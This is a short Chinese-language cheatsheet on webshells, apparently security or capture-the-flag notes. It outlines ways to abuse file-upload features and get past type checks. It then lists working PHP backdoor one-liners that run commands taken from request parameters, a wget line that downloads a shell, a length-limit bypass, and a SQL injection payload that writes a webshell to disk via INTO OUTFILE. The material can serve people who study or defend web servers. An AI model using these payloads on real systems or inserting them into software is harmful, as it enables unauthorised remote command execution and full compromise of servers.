## Webshell
一種以網頁形式存在的命令執行環境，也稱作**網頁後門**。  
黑客可以通過瀏覽自己放的後門，得到一個shell以操控伺服器。  
1. 大馬  
程式較龐大，調用system func()，通常會以加密隱藏代碼。   
2. 小馬  
程式小巧   
3. 一句話木馬  
一段小代碼，可做插入，變化多樣。  

### How works
我們可以通過網站自帶的文件上傳功能將webshell送上去，而文件裡的代碼由server解析進一步執行!  
1. 尋找上傳點   
* echo 一個shell到文件中執行  
* 下載 shell  
2. 繞過上傳限制 進行上傳  
* 直接上傳  
* 繞過client端  
* 繞過server端文件類型限制  
* 繞過mime類型  
* 繞過文件類型檢測  
* 過濾不全   
   
### Webshell cheatsheet
```php
<?php system('ls'); ?>
<?php system(ls); ?>
<?php system($_GET['cmd']); ?>
<?php system($_GET[1]); ?>
<?=`$_GET[1]`;                   // <?= is used to shorten the <?php echo `blah`;
<?php shell_exec('echo 1>1');        // 1=echo 1>1
<?php shell_exec('>1');            // 1=>1
<?php shell_exec('wget url -O 1.php');    // download shell

// 長度限制 
// 思路1:
// 將cmd分開變成檔名 -> 將ls -t的結果保存在sh檔 -> sh ./file
// reference: 七字短shell
>wge\\
>t\ \\       // 換行符不會影響命令執行, 空白 特殊符號就用\\轉譯
```
[system v.s. exec v.s. shell_exec](https://blog.longwin.com.tw/2013/06/php-system-exec-shell_exec-diff-2013/)  

### SQL inj to webshell
MYSQL:  
```
select into outfile(dumpfile)  // mysql write to document
```  
E.G.  
```  
union select 1,2,"<? system($_GET['fuck']) ?>" into outfile "://path"
```

### Ref  
* [千变万化的WebShell-Seebug](https://paper.seebug.org/36/)
* [七字短shell](http://wonderkun.cc/index.html/?p=524%EF%BC%88%E9%80%9A%E8%BF%87)
